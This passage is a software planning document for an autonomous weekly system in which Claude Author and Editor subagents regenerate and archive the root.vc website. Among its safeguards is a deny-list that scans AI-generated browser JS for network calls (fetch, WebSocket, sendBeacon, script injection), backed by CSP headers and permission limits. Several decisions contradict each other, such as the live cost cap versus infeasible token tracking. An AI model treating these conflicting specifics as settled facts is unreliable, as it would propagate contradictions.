---
title: "feat: Weekly AI-reinvented root.vc"
type: feat
status: active
date: 2026-06-01
origin: docs/brainstorms/weekly-ai-reinvention-requirements.md
---

# feat: Weekly AI-reinvented root.vc

## Overview

Add a fully autonomous weekly reinvention system to root.vc. Every Monday morning, Claude generates a wholly-new artifact (game, parody, faux app, etc.) that weaves the firm's real facts into the experience as easter eggs, statically freezes the prior week's drop under `/archive/YYYY-MM-DD/`, and ships a marketing-ready press kit alongside.

Architecture: **Author + Editor** agent pair driven by `anthropics/claude-code-action@v1` (SHA-pinned) on a GitHub Actions cron, smoke-tested via the existing Vitest + JSDOM harness, archived as static folders served directly by **Vercel** (post-migration from Netlify, U10), and deployed via auto-merge PR (preserves auditability and uses Vercel's main-branch Git integration). Self-improvement loop feeds raw last-N drops' ratings + social signals + Editor notes back into the next-cycle Author prompt.

The work extends — never replaces — the current architecture: vanilla JS/HTML/CSS, no framework, no TypeScript, JS-object-literal configs, JSDOM-based tests, GitHub Actions for automation.

---

## Problem Frame

Root Ventures has an unusual brand asset: its identity is already "Root makes weird, technically-loved things." The current site is a CLI terminal at [index.html](index.html); [welcome.htm](welcome.htm) is a GeoCities skin; [game.html](game.html) is the new Root Router game. All three render off a shared data layer of object-literal configs in [config/](config/).

The brainstorm (see origin) committed to: full AI reinvention on a weekly Monday cadence, autonomous theme selection, configs as deterministic substrate, firm facts woven into each artifact as easter eggs, history as an in-world themed entrance, press kit as first-class output, self-improvement via raw signals, and full auto ship gate. This plan defines **how** to build that system on top of the current repo.

---

## Requirements Trace

This plan satisfies origin requirements **R1–R24** (see [docs/brainstorms/weekly-ai-reinvention-requirements.md](docs/brainstorms/weekly-ai-reinvention-requirements.md)), with **R3 (anchor-fact presence) exempted for legacy archive entries** per DC1: the CLI terminal preserved at `/cli/` predates the system and is not held to current requirements.

**Origin actors:** A1 (visitors), A2 (Root team / ops), A3 (Author agent), A4 (Editor agent), A5 (Archive), A6 (Topical context fetcher).

**Origin flows:** F1 (weekly drop cycle), F2 (visitor encounters current week's artifact), F3 (visitor navigates to history), F4 (generation/ship failure → graceful degrade).

**Origin acceptance examples:** AE1 (covers R3 — airline-week fact placement), AE2 (covers R7, R18, R19 — broken-JS rollback), AE3 (covers R11, R12 — RPG-week history room), AE4 (covers R8, R13, R14 — press kit), AE5 (covers R9, R17 — performance log synthesis).

**Derived constraints surfaced during planning** (each documented under Key Technical Decisions):

- DC1. **Minimal bootstrap migration**: preserve the existing CLI terminal at `/cli/` so it survives first cycle's replacement of root `index.html`. Existing `welcome.htm` and `game.html` stay at their current paths (no `/archive/_legacy/` mirroring in v1). Full legacy-archive migration is deferred to follow-up.
- DC2. Cycle operates on a dated branch and auto-merges via PR, never pushes directly to `main`.
- DC3. GitHub Actions `concurrency:` group prevents overlapping cycles.
- DC4. Per-archive size budget: 2MB target, 5MB hard cap (enforced by smoke test).
- DC5. Post-deploy rollback uses `git revert` + manual push for v1. A dedicated workflow is deferred to follow-up (the brainstorm did not require this surface).
- DC6. **Anchor-fact coverage is 90% + Editor-approved rationale for any omission** (machine-verified by smoke test), not 100%. The 100% bar risks unfixable revision-loop failures on themes whose form can't accommodate 60+ entity callouts.
- DC7. History-entrance discoverability is enforced by a smoke test: rendered DOM contains a non-hidden `<a>` whose `href` resolves to a known archive permalink.
- DC8. 4-tier topical sensitivity rubric lives in an editable plain-text config (`config/topical-rubric.md`) so the team adjusts it without prompt changes.
- DC9. **Cycle cost cap is enforced by `--max-turns N` (claude_args) + GH Actions `timeout-minutes:` job-level wall-clock cap, with post-hoc spend audit logged to the failure-issue template.** Live token-tracking inside the orchestrator was infeasible because `claude-code-action` wraps the API calls; turn-and-time bounds + Anthropic console spending limits provide the actual ceiling.
- DC10. Diversity-memory window `N` defaults: theme diversity N=8, topical clustering N=4, rating context N=12. Orchestrator loads `max(N) = 12` archive entries once and slices per window.
- DC11. **AI-generated browser JS is scanned + sandboxed before ship.** Smoke tests apply a deny-list regex to every committed `.js` file under `/archive/YYYY-MM-DD/` (rejects `fetch`, `XMLHttpRequest`, `WebSocket`, `navigator.sendBeacon`, dynamic `<script>` injection, `meta http-equiv="Content-Security-Policy"` overrides). `vercel.json` adds a Content-Security-Policy header for `/archive/*` blocking external origins and `unsafe-inline` script (the artifact uses a nonce the cycle inserts).
- DC12. **Phase 0 runtime validation spike (new U0) precedes U1.** A 1-day dry-run inside `claude-code-action` validates: `schedule:` trigger compatibility, `Agent` tool availability for subagent spawning, `/last30days` skill invocability (or fallback to `WebSearch`/`WebFetch`), `Write` + `Bash`(`npm run smoke`) tool permissions, and observable token usage. Architecture commits to no further units until U0 passes.
- DC13. **JSDOM compatibility policy is part of `author-role.md`.** Anchor facts MUST be present in the static HTML pre-script-run (a `curl + grep` would find them) — this makes them resilient to whatever modern API the Author uses for enhancement. The Author is instructed: no `IntersectionObserver`, `ResizeObserver`, or `requestIdleCallback` without polyfill; no canvas/WebGL for content paths (decorative is fine); no top-level `await fetch()` for anchor-fact rendering.
- DC14. **Pin `anthropics/claude-code-action` to `@v1` (the version with documented `schedule:` support) and to a specific commit SHA** (not the floating tag). Existing `.github/workflows/claude.yml` migrates from `@beta` to the same pinned version.
- DC15. **Job-level least-privilege permissions block** in every cycle workflow: `contents: write`, `pull-requests: write`, `issues: write` only. `ANTHROPIC_API_KEY` has a per-key spending limit configured in the Anthropic console as a hard backstop independent of DC9.
- DC16. **Rating and rollback workflow triggers gate on a team-member allowlist** (via `if: contains(fromJson('[...]'), github.actor)`). Comments from non-allowlisted users are silently ignored. Rollback's `workflow_dispatch` is also allowlist-gated.
- DC17. **Brand-safety configs (`brand-brief.md`, `no-fly-list.md`, `topical-rubric.md`) are CODEOWNERS-gated**: PRs touching them require team-member approval, even though the files are intended as "easy to edit."
- DC18. **Autonomy posture is explicit: autonomous-by-default + reactive recovery, not pure autonomy.** The brainstorm's rejection of human concept gates stands. But DC2 (PR-based merge with Vercel preview deploys), the main-SHA-moved abort in U6, and the manual revert path in DC5 collectively mean the system is autonomous in the happy path and requires human triage in failure paths. This is a deliberate softening from the brainstorm's pure-autonomy framing; the team should know that the first ~5 cycles will probably need manual triage.
- DC19. **Hosting on Vercel; AI cycle still runs on GitHub Actions.** Vercel replaces Netlify for static hosting (U10 migrates `netlify.toml` → `vercel.json`, `netlify/functions/` → `api/`). The weekly cycle stays in GitHub Actions because `claude-code-action` is GH-Actions-native, gives skill access including `/last30days`, and has no execution-time limits. Vercel Cron + Functions was rejected for the cycle: Vercel runtimes don't host the Claude Code CLI (would force a direct-SDK rewrite of U4 and lose `/last30days`), and the Pro fluid-compute 800s ceiling is tight for an Author/Editor revision loop.

---

## Scope Boundaries

### Deferred for later

Carried verbatim from origin:

- Daily reinvention cadence — evaluate after 2–3 months of weekly operation.
- Mid-week event-triggered drops.
- Per-visitor personalization.
- Auto-generation of new portfolio/team/jobs facts (configs are human-edited only).
- A/B testing of variants within a single week.
- Mobile-specific generation.
- An automated fact-checker agent separate from the Editor.

### Outside this product's identity

Carried verbatim from origin:

- A static template-driven website with a generative theme system.
- A user-facing magazine "issue #N" framing.
- A sidecar "stable about page" at a separate URL.
- A founder-discovery or portfolio-evaluation product surface.
- A primary engineering-recruiting funnel.
- A human-in-loop concept-selection gate.

### Deferred to Follow-Up Work

Implementation work intentionally split out of v1:

- **Auto-tracked social engagement signals.** v1 ships with a `engagement.json` per archive entry that is initially populated manually. Self-improvement loop (origin R17) consequently runs ratings-only in v1; team should know this is a reduction from the brainstorm's stated three-signal mix and the engagement gap is the highest-priority follow-up.
- **Auto-posting tweet/LinkedIn drafts.** v1 outputs drafts to the press kit; team posts manually.
- **Multi-region scheduling / DR for the cron.** v1 trusts GitHub Actions cron reliability.
- **Plugin-managed `/last30days` skill installation.** v1 ships fallback path; properly plugin-managed install is follow-up.
- **Dedicated rollback workflow (`rollback.yml`).** v1 uses `git revert` + manual push. A workflow-based escape valve is a follow-up convenience once cycles are reliably running.
- **Comment-driven rating bot (`rate-drop.yml`).** v1 ratings are PR-edits to `rating.json`. A `/rate` comment bot is a follow-up if file editing proves high-friction.
- **Full legacy archive migration of `welcome.htm` and `game.html`** under `/archive/_legacy/`. v1 just preserves the URLs in place; mirroring as canonical archive entries is a follow-up.
- **Standalone `cycle-config.js`, `asset-library.js`, `notify-templates.js`.** v1 inlines these as named constants/templates in the orchestrator. Promote to separate files only when the team actually wants to tune a value or there's a second consumer.
- **Playwright visual smoke pass.** v1 is JSDOM-only with the DC13 author-side compat policy. Add Playwright when an artifact's visual quality genuinely needs it.

---

## Context & Research

### Relevant Code and Patterns

- **Configs as the substrate.** [config/portfolio.js](config/portfolio.js), [config/team.js](config/team.js), [config/jobs.js](config/jobs.js), [config/commands.js](config/commands.js), [config/help.js](config/help.js), [config/fs.js](config/fs.js) — all plain JS object literals assigned to top-level `const` globals. New configs must follow this shape or break with a documented rationale. JS object literals diff cleanly and read well for both humans and LLMs.
- **Build pipeline.** [scripts/build-assets.js](scripts/build-assets.js) concatenates an ordered list of source files (`appBundleSources`) into `js/app.bundle.js` (Terser-minified, committed). New bundle-included configs require updates to this list. Per-week artifacts under `/archive/` are self-contained and bypass the bundle entirely.
- **Test harness.** [tests/helpers/browser-env.js](tests/helpers/browser-env.js) builds a JSDOM window with `runScripts: "dangerously"`, supports `loadScripts([...paths])` and `exportValues([...names])`. The newly-added [tests/game.test.js](tests/game.test.js) is the closest precedent for testing an HTML-shaped artifact: it owns the markup snippet (`gameMarkup()`) and asserts on the JSDOM state after script execution. Smoke tests for generated artifacts follow this same pattern but load the *artifact's own HTML file* instead of an inline string.
- **GitHub Actions / Claude integration.** [.github/workflows/claude.yml](.github/workflows/claude.yml) already wires `anthropics/claude-code-action@beta` with `ANTHROPIC_API_KEY` from secrets for `@claude`-mention-triggered runs. The new cron workflow reuses the same secret and the same action; only the trigger changes (`on: schedule:`) and the prompt becomes self-contained (no human comment as input).
- **Hosting migrates from Netlify to Vercel (U10, DC19).** Existing [netlify.toml](netlify.toml) publishes `.` (repo root) with no build command. Post-migration, `vercel.json` declares the same static-root serving model plus CSP headers (DC11) and the Vercel API Route equivalent of the existing Netlify function. Any committed `/archive/YYYY-MM-DD/index.html` is immediately reachable at `https://root.vc/archive/YYYY-MM-DD/` on either platform — the migration is observably transparent to visitors. Vercel was picked over staying on Netlify for: better DX (preview deploys per PR are first-class), tighter GitHub integration for the auto-merge flow, and modern edge config.
- **CI workflow.** [.github/workflows/test.yml](.github/workflows/test.yml) runs `npm test` + `npm run build` on push to `main` and PRs. Cycle-generated commits will pass through this gate.
- **Netlify function precedent.** [netlify/functions/submit-application.js](netlify/functions/submit-application.js) is the only existing function; uses old-style `exports.handler = async (event, context)`. Not directly relevant to the cycle (which runs in GH Actions, not in a function) but precedent for any post-cycle webhook integrations later.

### Institutional Learnings

`docs/solutions/` does not exist yet. No prior captured learnings apply. This plan is a strong candidate to seed `docs/solutions/` via `/ce-compound` after the first ~3 cycles land — capturing the Author/Editor handoff contract, the cron + Netlify-PR trigger choice, the archive permalink scheme, the self-improvement signal format, and the brand-safety guardrails that survive the first few weeks.

### External References

- `anthropics/claude-code-action@beta` documentation (existing dependency).
- The `ai` package (Vercel AI SDK) is declared in [package.json](package.json) dependencies but **never imported** by any first-party file. v1 does not introduce it; if direct SDK use is added later for non-Claude-Code orchestration, this is the entry point.

### Constraints surfaced from research

- **Bundle source order is hard-coded.** New configs that need to be visible to the existing CLI terminal must be added to `appBundleSources`. Configs used only by the cycle (brand brief, no-fly list, topical rubric) stay out of the bundle.
- **Generated artifacts are committed.** `js/app.bundle.js` is checked in; cycle commits follow the same hygiene. The cycle must `git add` the new `/archive/YYYY-MM-DD/` folder + the new root `index.html` together.
- **CI runs on every PR.** Cycle commits go through `npm test && npm run build`. Smoke tests must therefore live in the existing Vitest suite (not a side-channel runner) and must pass deterministically.
- **`/last30days` is a Claude Code skill.** Invocable inside `claude-code-action`, not from a direct Anthropic SDK call. This is a load-bearing reason to use the action rather than the raw SDK.

---

## Key Technical Decisions

- **Runtime: `anthropics/claude-code-action@beta` on GitHub Actions cron.** Existing precedent in [.github/workflows/claude.yml](.github/workflows/claude.yml). Gives skill access (including `/last30days`), reuses `ANTHROPIC_API_KEY`. Direct Anthropic SDK was considered but rejected because it loses skill access and adds a new integration path without benefit.
- **Cycle ships via auto-merge PR, not direct push (DC2).** Cycle creates branch `cycle/YYYY-MM-DD`, opens PR with the new archive folder + updated root `index.html`, waits for CI green (existing `test.yml`), auto-merges if `main` HEAD hasn't moved. This gives Netlify deploy previews "for free" (you can preview a weekly drop before it lands if you want), preserves audit trail, and avoids force-pushes.
- **Concurrency lock via GitHub Actions `concurrency:` group (DC3).** Group name `weekly-cycle`, `cancel-in-progress: false`. A second cron tick while the first is mid-cycle is queued, not cancelled.
- **Config format: JS object literals for structured configs; Markdown for prose-heavy guidance.** Match existing pattern for `firm.js`, `asset-library.js`. Brand brief, no-fly list, and topical rubric are Markdown (`config/brand-brief.md` etc.) because they are human-edited prose that the team will iterate on without code review.
- **Per-archive size budget: 2MB target, 5MB hard cap (DC4).** Enforced by a smoke test that measures the generated `/archive/YYYY-MM-DD/` directory size and rejects base64-inlined images over 50KB. Author is instructed to prefer SVG, CSS-only effects, asset-library reuse, or small generated PNGs.
- **Anchor-fact presence is machine-verified, not just Editor-reviewed (DC6).** Smoke test asserts that the rendered DOM (post-JS execution in JSDOM) contains *every* portfolio company name, *every* team member name, firm name and mission, and a working `mailto:` link. Author chooses how visible; smoke test enforces presence.
- **History entrance is machine-verified (DC7).** Smoke test asserts the rendered DOM contains at least one `<a>` whose `href` resolves to a known archive permalink, the element is not `display:none` / `visibility:hidden` / `opacity:0`, and the element or one of its ancestors within 3 levels has non-empty text or an `aria-label`. Editor still applies subjective "is this actually findable" judgment on top.
- **Editor's sensitivity rubric is a 4-tier editable config (DC8).** `config/topical-rubric.md` defines hard-block, soft-block, approve-with-care, and lean-in tiers with examples. Editor's prompt references the file by path so the team edits it directly.
- **Cost ceiling acts as a circuit breaker (DC9).** Cycle accumulates token spend; if total exceeds `$25` (configurable), it aborts and falls back to last week's drop with notification. Prevents runaway loops.
- **Diversity-memory window defaults (DC10).** Theme-keys diversity `N=8`, topical clustering `N=4`, rating context `N=12`. All configurable via `config/cycle-config.js`.
- **Bootstrap migration (DC1).** Existing artifacts become legacy archive entries: current CLI `index.html` → `archive/_legacy/cli-terminal/`, current `welcome.htm` → `archive/_legacy/geocities/`, current `game.html` → `archive/_legacy/root-router/`. Each gets a hand-written `meta.json`. R3 (anchor-fact presence) is explicitly waived for legacy entries via a `legacy: true` flag in meta — the system never re-evaluates these against current requirements. Original URLs (`/welcome.htm`, `/game.html`) remain as path aliases so existing links don't break. After first cycle, root `index.html` is the current week's drop; the CLI terminal lives on at its legacy archive URL.
- **Author and Editor are separate Claude Code subagent calls, not a single conversation.** Separate contexts prevent Editor sycophancy ("the Author worked hard, looks fine to me"). Each gets a clean prompt and only the artifacts it needs. Author retry sees prior Editor critiques as input.
- **Press kit notification surface (R13–R14): GitHub issue + drop summary in the auto-merge PR description.** When the cycle ships successfully, the PR description contains the theme name, editorial note, tweet draft, screenshot brief, and a link to the rating CTA. After merge, the cycle opens a "Drop shipped: YYYY-MM-DD" issue that the team can react to / rate via. Slack is deferred unless the team already has a GitHub→Slack bridge wired up.
- **Rating surface (deferred-to-planning question resolved): in-repo `rating.json` per archive entry.** Team appends to `archive/YYYY-MM-DD/rating.json` either by directly editing the file (PR) or by responding to the "Drop shipped" issue (a small GH Action listens for `/rate N "note"` comments and updates the file). Simpler than a Slack bot, keeps state in the repo, fits the existing GitHub-centric workflow.
- **Monday drop time (deferred-to-planning question resolved): 9am PT (UTC-08:00) on Mondays.** Pacific because that's Root's home time zone. Generation cycle fires Sunday 6pm PT for ~15 hours of buffer.

---

## Open Questions

### Resolved During Planning

- **Where does the cycle run?** GitHub Actions cron + `claude-code-action@v1` (SHA-pinned per DC14). Matches existing precedent and gives skill access; @v1 documents the `schedule:` trigger that @beta does not.
- **What format are the new configs?** JS object literals (structured) and Markdown (prose-heavy guidance). Matches existing pattern.
- **How is the archive served?** Static folders under `/archive/YYYY-MM-DD/` in the same Netlify deploy; published by `netlify.toml`'s `publish = "."`.
- **How are smoke tests written?** Extend the Vitest + JSDOM harness at [tests/helpers/browser-env.js](tests/helpers/browser-env.js). Pattern from [tests/game.test.js](tests/game.test.js).
- **How does the cycle commit and deploy?** Branch `cycle/YYYY-MM-DD` → PR with auto-merge → CI passes → merge to `main` → Vercel auto-deploys.
- **How do legacy artifacts fit?** Migrated under `archive/_legacy/<slug>/` with hand-written meta. Legacy URLs preserved via path aliases.
- **What's the Author/Editor interaction model?** Separate subagent calls with their own contexts. Author retry receives prior Editor critiques as input.
- **Where does press-kit notification go?** Auto-merge PR description + post-merge "Drop shipped" issue.
- **How does rating work?** In-repo `rating.json` per archive, populated via PR edit or GitHub issue comment.
- **What time on Monday does the drop go live?** Cron set to `0 1 * * 1` (Monday 01:00 UTC = Sunday 17:00 PST in winter / Sunday 18:00 PDT in summer). Drop becomes live as soon as Vercel auto-deploys post-merge (typically minutes after merge).
- **How is generated JS sandboxed?** DC11: source-scan deny-list + CSP header on `/archive/*`.
- **Editor sycophancy: how do we know it works?** Pre-cron calibration step in Phase 2 (3 manually-graded dry-run outputs vs. Editor decisions).
- **How is cost capped?** DC9: `--max-turns` + GH Actions `timeout-minutes:` + Anthropic console per-key limit. No live tracking inside the orchestrator.
- **Where does the legacy CLI live after first cycle?** DC1: at `/cli/` as a fully-vendored snapshot. `/welcome.htm` and `/game.html` stay at their current paths.
- **How is the rating signal collected?** Direct PR edit to `archive/YYYY-MM-DD/rating.json` in v1; schema-validated in CI. Comment-bot deferred.
- **What's the anchor-fact coverage requirement?** DC6: 90% + Editor-approved rationale, with firm name/mission/contact at 100%.
- **How is the autonomy posture characterized?** DC18: autonomous-by-default + reactive recovery. First ~5 cycles expected to need manual triage.

### Deferred to Implementation

- [Affects U5][Needs research] Exact mechanism for `/last30days` skill availability inside `claude-code-action` (gstack plugin install? vendored? Webfetch fallback?). U5 builds both the happy path (skill available) and the fallback path (direct WebSearch + WebFetch tool calls) and selects at runtime.
- [Affects U3][Technical] JSDOM cannot execute all browser-rendering paths — generative artifacts using canvas, WebGL, large fonts, or video can't be fully verified by smoke tests. v1 accepts this gap; the Editor's judgment carries the visual side. If a Playwright pass becomes worth adding, it's a follow-up.
- [Affects U4][Technical] Whether the cycle prompt invokes the Author/Editor subagents via the `Agent` tool or unfolds the entire workflow inline. Prefer `Agent` (separate contexts) but the orchestrator's pseudo-code in High-Level Technical Design assumes either is workable.
- [Affects U7][Technical] GitHub Action that listens for `/rate N "note"` comments — write as small inline workflow vs use a community action. Decide at implementation time based on what minimizes new dependencies.
- [Affects U6][Operational] Whether the auto-merge PR is enabled via GitHub branch protection settings (preferred — no extra tokens) or via a PAT in the workflow.

---

## Output Structure

The plan creates the following new structure on top of the existing repo:

```
cli-website/
├── archive/                                 # NEW: static drop archive
│   └── YYYY-MM-DD/                          # NEW per cycle
│       ├── index.html                       # cycle artifact
│       ├── (assets: style.css, script.js, etc.)
│       ├── meta.json                        # theme_name, editorial_note, where_facts_live, history_view_concept, theme_keys[], topical, topical_hook?, topical_brief?, csp_nonce
│       ├── social.json                      # tweet_draft, tweet_thread, linkedin_draft, screenshot_brief
│       ├── rating.json                      # [{ rater, rating: 1-5, note, ts }]
│       └── engagement.json                  # social engagement counts (manual in v1)
├── cli/                                     # NEW: preserved CLI terminal at stable URL
│   └── index.html                           # NEW: snapshot of pre-cycle root index.html
├── config/
│   ├── firm.js                              # NEW: firm metadata (joins appBundleSources)
│   ├── brand-brief.md                       # NEW: voice DOs, tone (CODEOWNERS-gated, DC17)
│   ├── no-fly-list.md                       # NEW: taboo topics (CODEOWNERS-gated, DC17)
│   ├── topical-rubric.md                    # NEW: 4-tier rubric (CODEOWNERS-gated, DC17)
│   ├── weekly-hook.txt                      # NEW: optional one-line nudge from team
│   └── (existing configs unchanged; asset-library + cycle-config inlined in orchestrator for v1)
├── scripts/
│   ├── cycle/                               # NEW: orchestrator + prompt templates
│   │   ├── run-cycle.js                     # NEW: Node entry; carries inlined cycle constants + notify templates
│   │   ├── prompts/
│   │   │   ├── cycle.md                     # NEW: top-level cycle prompt
│   │   │   ├── author-role.md               # NEW: Author subagent instructions (incl. DC13 JSDOM-compat policy)
│   │   │   ├── editor-role.md               # NEW: Editor subagent instructions (incl. DC8 rubric reference)
│   │   │   └── topical-fetcher.md           # NEW: fetcher subagent prompt
│   │   ├── output-schema.js                 # NEW: validates Author output
│   │   ├── performance-log.js               # NEW: assembles last-12 drops' signals
│   │   ├── freeze-archive.js                # NEW: writes Author output to archive/YYYY-MM-DD/
│   │   └── source-scan.js                   # NEW: deny-list regex on generated JS (DC11)
│   └── (existing build-assets.js modified to include firm.js)
├── tests/
│   ├── cycle/                               # NEW: smoke tests run against artifacts
│   │   ├── anchor-facts.test.js             # NEW: 90% portfolio coverage + Editor rationale
│   │   ├── history-entrance.test.js         # NEW
│   │   ├── archive-size.test.js             # NEW
│   │   ├── structural.test.js               # NEW: JSDOM-compat allowlist for console warnings
│   │   └── source-scan.test.js              # NEW: invokes scripts/cycle/source-scan.js
│   ├── config/                              # NEW: validates expanded config layer
│   │   └── expanded-config.test.js          # NEW
│   └── helpers/
│       └── artifact-env.js                  # NEW: extends browser-env for artifact loading
├── vercel.json                              # NEW: replaces netlify.toml — build, headers (CSP for /archive/*), redirects (U10)
├── api/
│   └── submit-application.js                # NEW: Vercel API Route (port of netlify/functions/submit-application.js)
├── .github/
│   ├── CODEOWNERS                           # NEW: gates brand-brief, no-fly-list, topical-rubric
│   └── workflows/
│       ├── weekly-cycle.yml                 # NEW: Sunday-evening cron @v1 SHA-pinned
│       └── spike.yml                        # NEW: U0 manual dispatch for runtime validation
```

Deferred from v1 (see Scope Boundaries / Deferred to Follow-Up Work): `archive/_legacy/`, `config/asset-library.js`, `config/cycle-config.js`, `scripts/cycle/notify-templates.js`, `.github/workflows/rollback.yml`, `.github/workflows/rate-drop.yml`.

This is a scope declaration showing the expected shape — the implementer may adjust if implementation reveals a better layout. The per-unit `**Files:**` sections remain authoritative.

---

## High-Level Technical Design

> *This illustrates the intended approach and is directional guidance for review, not implementation specification. The implementing agent should treat it as context, not code to reproduce.*

### Author output schema (validated by `scripts/cycle/output-schema.js`)

```
{
  "site": {
    "files": {
      "index.html": "<full HTML>",
      "style.css": "<full CSS>",
      "script.js": "<full JS, optional>",
      "assets/...": "<additional files keyed by relative path>"
    }
  },
  "meta": {
    "theme_name": "string (kebab-case, e.g. 'fake-airline')",
    "editorial_note": "1-3 sentences explaining the concept",
    "where_facts_live": {
      "firm_name": "selector or location description",
      "mission": "selector or location description",
      "portfolio": "selector or location description",
      "team": "selector or location description",
      "contact": "selector or location description"
    },
    "history_view_concept": "1-2 sentences on the in-world history entrance",
    "theme_keys": ["e.g. airline", "retro-marketing", "interactive"],
    "topical": true,
    "topical_hook": "the specific event/trend referenced (when topical=true)",
    "topical_brief": ["full 3-5 bullet brief used as seed (when topical=true)"]
  },
  "social": {
    "tweet_draft": "string (<=280 chars)",
    "tweet_thread": ["string", "string", ...],
    "linkedin_draft": "string",
    "screenshot_brief": "description of which view(s) to screenshot for posting"
  }
}
```

### Cycle prompt structure (orchestrator pseudo-flow)

```
1. READ:  config/*.{js,md,txt}, last N=8 archive meta.json + rating.json + engagement.json
2. FETCH: optional topical context via /last30days skill (1-7 day window) → brief
          (on failure: proceed with topical: false)
3. AUTHOR (subagent, separate context):
   inputs:  configs, performance log, optional topical brief, brand brief, no-fly list
   output:  validated press-kit JSON per schema above
4. EDITOR (subagent, separate context):
   inputs:  Author output, brand brief, no-fly list, topical rubric, diversity memory
   output:  { decision: "approve" | "reject", critique: "..." }
   on reject: loop back to AUTHOR with critique appended, retry counter +1, ≤ N=3 retries
5. WRITE: artifact files to archive/YYYY-MM-DD/
6. RUN:   smoke test suite against archive/YYYY-MM-DD/index.html
          on fail: same path as Editor reject (loop back, up to N=3)
7. COMMIT: branch cycle/YYYY-MM-DD, files committed, root index.html updated to point at this drop
8. PR:    open auto-merge PR; on green CI + clean main, merge → Netlify deploys
9. NOTIFY: post-merge "Drop shipped: YYYY-MM-DD" issue with press-kit summary
10. FAIL: any irrecoverable step → branch deleted, last-good main untouched,
          GH issue opened ("Cycle failed YYYY-MM-DD: <reason>") for team triage
```

### Smoke test pseudocode

```
loadArtifact(archive/YYYY-MM-DD/)
  → render in JSDOM with runScripts: "dangerously"
  → wait for DOMContentLoaded + 100ms

assertAnchorFacts:
  for company in portfolio: assert(company.name appears in textContent OR href)
  for member in team:       assert(member.name appears in textContent)
  assert(firm.name appears in textContent)
  assert(firm.mission appears in textContent)
  assert(at least one mailto:hello@root.vc OR equivalent in <a href>)

assertHistoryEntrance:
  candidates = querySelectorAll('a[href*="/archive/"]')
  assert(candidates.length >= 1)
  for a in candidates:
    s = getComputedStyle(a)
    if s.display != 'none' && s.visibility != 'hidden' && s.opacity > 0:
      assert(a.textContent || a.ariaLabel || ancestor-3-deep with text)
      return PASS
  FAIL

assertArchiveSize:
  total = sizeOf(archive/YYYY-MM-DD/)
  assert(total < 5MB hard cap)
  warn  if total > 2MB (target)
  for f in files: assert no base64-inline > 50KB

assertStructural:
  assert(no JS console errors during load)
  assert(<title> exists and non-empty)
  assert(no broken relative paths in href/src)
```

---

## Implementation Units

### Phase 0: Runtime validation spike

- [ ] U0. **`claude-code-action` capability spike** *(Phase 0)*

**Goal:** Validate every runtime assumption U1–U8 depends on, before committing further effort. Block all other units until U0 passes; revisit architecture if any check fails.

**Requirements:** DC12, DC14

**Dependencies:** None

**Files:**
- Create: `.github/workflows/spike.yml` — manual `workflow_dispatch:` workflow invoking `anthropics/claude-code-action@v1` (SHA-pinned) with a minimal cycle-shaped prompt
- Create: `scripts/cycle/spike-prompt.md` — the spike's instructions to Claude Code

**Approach:**
- One-page prompt that asks Claude Code, inside the action, to: (a) confirm `on: schedule:` was the trigger (or `workflow_dispatch` for the spike); (b) spawn a no-op `Agent` subagent and report success; (c) invoke `/last30days` with a 7-day window, OR confirm the skill is missing and fall back to a `WebSearch` call; (d) `Write` a file under `/tmp/`; (e) execute a single `Bash(npm run smoke -- --artifact=archive/_legacy/cli-terminal)` (against the bootstrap snapshot once U2 lands; for the spike, against a stub `index.html`); (f) report token usage if observable.
- The workflow uploads the spike's output JSON as a job artifact for review.
- Each capability is a pass/fail. Total cost target: ≤ $2.

**Test scenarios:**
- *Verification (not unit tests):* All six checks pass in the spike run. If `Agent` spawning fails, U4's separate-context design is impossible — revisit Editor sycophancy mitigation. If `/last30days` and `WebSearch` both fail, U5 ships disabled with `topical: false` always. If token usage is unobservable, DC9 stays at turn/wallclock caps only.

**Verification:**
- Spike workflow completes successfully on `workflow_dispatch`.
- Output artifact records each capability pass/fail.
- If any P0 capability fails (`Agent`, `Write`, `Bash`), pause Phase 1 and update Key Technical Decisions before proceeding.

---

- [ ] U10. **Migrate hosting from Netlify to Vercel** *(Phase 0)*

**Goal:** Replace Netlify with Vercel as the static hosting platform. The AI weekly cycle stays on GitHub Actions (DC19); only hosting moves. Set up Vercel project, migrate the single existing serverless function, migrate CSP/redirect/header config, cut DNS, decommission Netlify.

**Requirements:** DC19, DC11 (CSP via vercel.json)

**Dependencies:** None (parallel with U0)

**Files:**
- Create: `vercel.json` — Vercel project config: build settings (none — static root), headers (CSP for `/archive/*` per DC11), redirects (path aliases as needed), function config for the application API route
- Create: `api/submit-application.js` — port of [netlify/functions/submit-application.js](netlify/functions/submit-application.js) to Vercel API Routes (`export default async function handler(req, res) {...}`); same `ATTIO_WEBHOOK_URL` env var, same Attio integration
- Delete: `netlify.toml`
- Delete: `netlify/functions/submit-application.js`
- Delete: `netlify/` directory
- Modify: `package.json` — remove `netlify-cli` from dependencies (only used for `npm start` → `netlify dev`); replace with `vercel` dev workflow or `npx serve` for local
- Modify: `package.json` `scripts.start` — point at Vercel dev (`vercel dev`) or simple static server
- Modify: [README.md](README.md) — update Netlify badge → Vercel badge; update local dev instructions
- Modify: [config/commands.js](config/commands.js) — the `apply` command POSTs to `/.netlify/functions/submit-application`; update to `/api/submit-application` so the CLI's job-application flow works on Vercel
- Modify: [.env.example](.env.example) — Vercel/Attio env var names if they differ
- Test: `tests/api/submit-application.test.js` (port the existing test if any; verify the new handler signature)

**Approach:**
- **Migration sequence (zero-downtime):**
  1. Create Vercel project linked to the GitHub repo (manual one-time setup via Vercel dashboard or `vercel link`)
  2. Configure env vars on Vercel (`ATTIO_WEBHOOK_URL`)
  3. Land `vercel.json`, `api/submit-application.js`, and the commands.js update in this PR
  4. Verify the Vercel preview deploy works end-to-end (CLI loads, `apply` command posts to `/api/submit-application` successfully, CSP headers present on `/archive/*` paths)
  5. Cut DNS: change root.vc A/CNAME records from Netlify to Vercel
  6. Verify production traffic works
  7. Delete Netlify files in a follow-up PR (or this same PR) once DNS has propagated
  8. Decommission the Netlify site (manual step on Netlify dashboard)
- **CSP via `vercel.json` `headers` block:**
  ```json
  {
    "headers": [{
      "source": "/archive/(.*)",
      "headers": [{ "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self' 'nonce-${nonce}'; ..." }]
    }]
  }
  ```
  Note: Vercel's headers don't support runtime variable substitution for the nonce. The cycle's freeze-archive step writes the resolved CSP value into the artifact's `<meta http-equiv>` tag (allowed only for the cycle, blocked for everything else via source-scan).
- **No cycle changes:** the weekly cycle workflow still runs on GitHub Actions; it commits to `main`, Vercel auto-deploys on push. The integration is identical in shape to the prior Netlify auto-deploy — just a different platform behind the curtain.

**Patterns to follow:**
